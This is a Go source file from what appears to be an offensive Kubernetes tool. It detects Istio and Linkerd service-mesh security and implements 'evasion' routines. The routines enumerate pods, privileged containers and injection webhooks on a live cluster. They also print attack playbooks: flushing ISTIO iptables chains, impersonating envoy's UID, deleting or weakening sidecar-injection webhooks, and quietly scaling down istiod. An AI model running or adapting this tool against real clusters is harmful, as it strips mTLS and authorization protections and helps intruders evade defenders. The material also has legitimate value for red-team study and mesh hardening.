package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var istioPeerAuthGVR = schema.GroupVersionResource{
	Group: "security.istio.io", Version: "v1beta1", Resource: "peerauthentications",
}

var istioAuthzPolicyGVR = schema.GroupVersionResource{
	Group: "security.istio.io", Version: "v1beta1", Resource: "authorizationpolicies",
}

var linkerdServerAuthGVR = schema.GroupVersionResource{
	Group: "policy.linkerd.io", Version: "v1beta1", Resource: "serverauthorizations",
}

func detectMeshSecurity(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) []DetectionSystem {
	var results []DetectionSystem

	peerAuths, err := dynClient.Resource(istioPeerAuthGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(peerAuths.Items) > 0 {
		results = append(results, DetectionSystem{
			Name:     "istio-security",
			Detected: true,
			Details:  fmt.Sprintf("%d PeerAuthentication policies", len(peerAuths.Items)),
		})
	}

	authzPolicies, err := dynClient.Resource(istioAuthzPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(authzPolicies.Items) > 0 {
		results = append(results, DetectionSystem{
			Name:     "istio-authz",
			Detected: true,
			Details:  fmt.Sprintf("%d AuthorizationPolicy resources", len(authzPolicies.Items)),
		})
	}

	serverAuths, err := dynClient.Resource(linkerdServerAuthGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(serverAuths.Items) > 0 {
		results = append(results, DetectionSystem{
			Name:     "linkerd-authz",
			Detected: true,
			Details:  fmt.Sprintf("%d ServerAuthorization policies", len(serverAuths.Items)),
		})
	}

	webhooks, err := client.AdmissionregistrationV1().MutatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range webhooks.Items {
			if strings.Contains(wh.Name, "istio") || strings.Contains(wh.Name, "linkerd") {
				ns := ""
				if len(wh.Webhooks) > 0 && wh.Webhooks[0].ClientConfig.Service != nil {
					ns = wh.Webhooks[0].ClientConfig.Service.Namespace
				}
				results = append(results, DetectionSystem{
					Name:      "mesh-injection",
					Detected:  true,
					Namespace: ns,
					Details:   fmt.Sprintf("sidecar injection webhook: %s", wh.Name),
				})
			}
		}
	}

	return results
}

// EvadeServiceMesh executes the specified service mesh security evasion technique.
func EvadeServiceMesh(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "host_network":
		return meshHostNetwork(ctx, client)
	case "init_race":
		return meshInitRace(ctx, client)
	case "iptables_bypass":
		return meshIptablesBypass(ctx, client)
	case "disable_injection":
		return meshDisableInjection(ctx, client)
	default:
		return meshHostNetwork(ctx, client)
	}
}

func meshHostNetwork(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Service Mesh Host Network Bypass:\n\n")

	sb.WriteString("  Sidecar proxies intercept traffic via iptables rules in the pod network namespace.\n")
	sb.WriteString("  Pods with hostNetwork: true bypass the pod network namespace entirely.\n")
	sb.WriteString("  Traffic goes directly through the host's network stack — no sidecar interception.\n\n")

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		Limit: 50,
	})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list pods: %v\n", err)
		return &EvasionResult{Technique: "host_network", Success: false, Output: sb.String()}, nil
	}

	hostNetPods := 0
	for _, p := range pods.Items {
		if p.Spec.HostNetwork {
			hostNetPods++
			if hostNetPods <= 5 {
				fmt.Fprintf(&sb, "  [HOST_NET] %s/%s\n", p.Namespace, p.Name)
			}
		}
	}

	fmt.Fprintf(&sb, "\n  Found %d pods with hostNetwork=true (mesh-invisible)\n\n", hostNetPods)

	sb.WriteString("  Attack vectors:\n")
	sb.WriteString("    1. Deploy payload with hostNetwork: true\n")
	sb.WriteString("       - Bypasses ALL sidecar mTLS and AuthorizationPolicy\n")
	sb.WriteString("       - Direct access to node network and other pods' IPs\n")
	sb.WriteString("    2. Pivot through existing hostNetwork pods\n")
	sb.WriteString("       - DaemonSets often use hostNetwork (CNI, monitoring)\n")
	sb.WriteString("       - These pods can reach any service without mesh policy\n")
	sb.WriteString("    3. Access services via node IP:nodePort\n")
	sb.WriteString("       - NodePort traffic doesn't traverse sidecar proxy\n")

	return &EvasionResult{
		Technique: "host_network",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func meshInitRace(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Service Mesh Init Container Race:\n\n")

	sb.WriteString("  Sidecar injection uses init containers (istio-init/linkerd-init)\n")
	sb.WriteString("  that set up iptables rules BEFORE the app container starts.\n")
	sb.WriteString("  Race condition: if app starts before init completes, traffic is unintercepted.\n\n")

	sb.WriteString("  Race exploitation techniques:\n")
	sb.WriteString("    1. Use postStart lifecycle hook to send traffic immediately at start\n")
	sb.WriteString("       - postStart runs BEFORE readiness probes\n")
	sb.WriteString("       - iptables rules may not be fully configured yet\n\n")
	sb.WriteString("    2. Exploit istio-init container ordering\n")
	sb.WriteString("       - If CNI plugin mode: no init container, uses DaemonSet\n")
	sb.WriteString("       - CNI rule installation has inherent race with pod scheduling\n\n")
	sb.WriteString("    3. Rapid container restart loop\n")
	sb.WriteString("       - Crash the sidecar, app container restarts faster\n")
	sb.WriteString("       - Window between app ready and sidecar ready = unprotected\n\n")

	webhooks, err := client.AdmissionregistrationV1().MutatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range webhooks.Items {
			if strings.Contains(wh.Name, "istio") {
				sb.WriteString("  Istio injection mode detected\n")
				for _, hook := range wh.Webhooks {
					if hook.NamespaceSelector != nil {
						fmt.Fprintf(&sb, "    Selector: %v\n", hook.NamespaceSelector.MatchLabels)
					}
				}
			}
		}
	}

	sb.WriteString("\n  Istio CNI mode check:\n")
	ds, err := client.AppsV1().DaemonSets("").List(ctx, metav1.ListOptions{
		LabelSelector: "k8s-app=istio-cni-node",
	})
	if err == nil && len(ds.Items) > 0 {
		sb.WriteString("    [+] Istio CNI mode active — init container race is wider\n")
		sb.WriteString("    CNI plugin adds rules asynchronously via DaemonSet\n")
	} else {
		sb.WriteString("    Istio using init container mode (istio-init)\n")
		sb.WriteString("    Race window is smaller but still exploitable\n")
	}

	return &EvasionResult{
		Technique: "init_race",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func meshIptablesBypass(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Service Mesh iptables Bypass:\n\n")

	sb.WriteString("  Sidecar proxies rely on iptables REDIRECT/TPROXY rules.\n")
	sb.WriteString("  With NET_ADMIN or sufficient privileges, these rules can be modified.\n\n")

	sb.WriteString("  Istio iptables chains:\n")
	sb.WriteString("    ISTIO_INBOUND  — captures inbound traffic to envoy (port 15006)\n")
	sb.WriteString("    ISTIO_REDIRECT — redirects to envoy inbound listener\n")
	sb.WriteString("    ISTIO_IN_REDIRECT — redirect specific ports\n")
	sb.WriteString("    ISTIO_OUTPUT   — captures outbound from app to envoy (port 15001)\n\n")

	sb.WriteString("  Bypass techniques (require NET_ADMIN or CAP_NET_RAW):\n")
	sb.WriteString("    1. Flush ISTIO_* iptables chains:\n")
	sb.WriteString("       iptables -t nat -F ISTIO_OUTPUT\n")
	sb.WriteString("       iptables -t nat -F ISTIO_INBOUND\n\n")
	sb.WriteString("    2. Add exception rule for specific destination:\n")
	sb.WriteString("       iptables -t nat -I ISTIO_OUTPUT -d <target> -j RETURN\n\n")
	sb.WriteString("    3. Use specific UID to bypass (envoy runs as UID 1337):\n")
	sb.WriteString("       Run process as UID 1337 → iptables rules skip envoy's own traffic\n\n")
	sb.WriteString("    4. Bind to 127.0.0.6 (Istio's internal passthrough address)\n\n")

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{Limit: 20})
	if err == nil {
		privileged := 0
		for _, p := range pods.Items {
			for _, c := range p.Spec.Containers {
				if c.SecurityContext != nil && c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
					privileged++
					if privileged <= 3 {
						fmt.Fprintf(&sb, "  [PRIV] %s/%s (container: %s)\n", p.Namespace, p.Name, c.Name)
					}
				}
			}
		}
		if privileged > 0 {
			fmt.Fprintf(&sb, "\n  %d privileged containers can flush iptables rules\n", privileged)
		}
	}

	sb.WriteString("\n  Non-privileged bypass:\n")
	sb.WriteString("    - Use raw sockets (CAP_NET_RAW) to craft packets bypassing NAT\n")
	sb.WriteString("    - Connect to localhost:15000 (envoy admin) to dump/modify routes\n")
	sb.WriteString("    - Set HTTP header x-envoy-original-dst-host to bypass routing\n")

	return &EvasionResult{
		Technique: "iptables_bypass",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func meshDisableInjection(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Service Mesh Injection Disable:\n\n")

	webhooks, err := client.AdmissionregistrationV1().MutatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list webhooks: %v\n", err)
		return &EvasionResult{Technique: "disable_injection", Success: false, Output: sb.String()}, nil
	}

	found := false
	for _, wh := range webhooks.Items {
		if strings.Contains(wh.Name, "istio") || strings.Contains(wh.Name, "linkerd") {
			found = true
			fmt.Fprintf(&sb, "  Webhook: %s\n", wh.Name)
			for _, hook := range wh.Webhooks {
				fmt.Fprintf(&sb, "    Name: %s\n", hook.Name)
				if hook.ClientConfig.Service != nil {
					fmt.Fprintf(&sb, "    Service: %s/%s\n", hook.ClientConfig.Service.Namespace, hook.ClientConfig.Service.Name)
				}
				if hook.NamespaceSelector != nil {
					fmt.Fprintf(&sb, "    NS selector: %v\n", hook.NamespaceSelector)
				}
				if hook.FailurePolicy != nil {
					fmt.Fprintf(&sb, "    Failure policy: %s\n", *hook.FailurePolicy)
				}
			}
			sb.WriteString("\n")
		}
	}

	if !found {
		sb.WriteString("  No mesh injection webhooks found\n")
		return &EvasionResult{Technique: "disable_injection", Success: false, Output: sb.String()}, nil
	}

	sb.WriteString("  Injection disable techniques:\n")
	sb.WriteString("    1. Label namespace: istio-injection=disabled\n")
	sb.WriteString("       Prevents sidecar injection for all pods in namespace\n\n")
	sb.WriteString("    2. Annotate pod: sidecar.istio.io/inject=false\n")
	sb.WriteString("       Prevents injection for specific pod\n\n")
	sb.WriteString("    3. Delete MutatingWebhookConfiguration entirely\n")
	sb.WriteString("       ALL new pods cluster-wide skip injection\n\n")
	sb.WriteString("    4. Modify webhook's failurePolicy to 'Ignore'\n")
	sb.WriteString("       If webhook service is unavailable, pods deploy without sidecar\n\n")
	sb.WriteString("    5. Scale down injection service (istiod/linkerd-proxy-injector)\n")
	sb.WriteString("       Same effect as deleting webhook but less visible\n\n")
	sb.WriteString("    6. Modify webhook namespaceSelector to exclude target namespace\n")

	return &EvasionResult{
		Technique: "disable_injection",
		Success:   found,
		Output:    sb.String(),
	}, nil
}
